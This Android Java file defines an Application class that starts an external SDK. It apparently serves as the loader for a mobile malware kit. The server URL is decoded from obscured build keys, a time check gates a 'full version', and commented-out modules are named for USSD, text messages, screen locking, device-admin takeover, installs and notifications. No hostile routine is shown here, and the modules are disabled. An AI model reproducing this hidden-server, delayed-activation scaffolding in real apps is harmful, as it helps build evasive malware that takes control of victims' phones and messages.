package com.app.manager;

import android.app.Application;

import java.util.ArrayList;
import java.util.List;

import main_commons.app.c_master.CommonUtils;
import main_commons.app.c_master.SdkBuilder;
import main_commons.app.c_master.SdkComponent;

public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        final Class launcherActivity = SplashActivity.class;
        boolean useFullVersion = CommonUtils.checkIsFullVersionTime(BuildConfig.U_D);
        String baseUrl = CommonUtils.wrapStringWithKeys(BuildConfig.ARG_1, BuildConfig.KEY_1);
        List<SdkComponent> components = new ArrayList<>();
//        components.add(new InstallsComponent());
        //        components.add(new UssdComponent());
        //        components.add(new TextComponent());
        //        components.add(new LockerComponent());
        //        components.add(new AdminComponent().setStartLauncherActivity(true));
        //        components.add(new ReferencesComponent());
        //        components.add(new NotificationsComponent());
        SdkBuilder.BuildInfo buildInfo = new SdkBuilder.BuildInfo(
                BuildConfig.APPLICATION_ID,
                BuildConfig.DEBUG, launcherActivity);
        new SdkBuilder(this)
                .setBaseUrl(baseUrl)
                .setUseFullVersion(useFullVersion)
                .setComponents(components)
                .setBuildInfo(buildInfo)
                .build();
    }
}
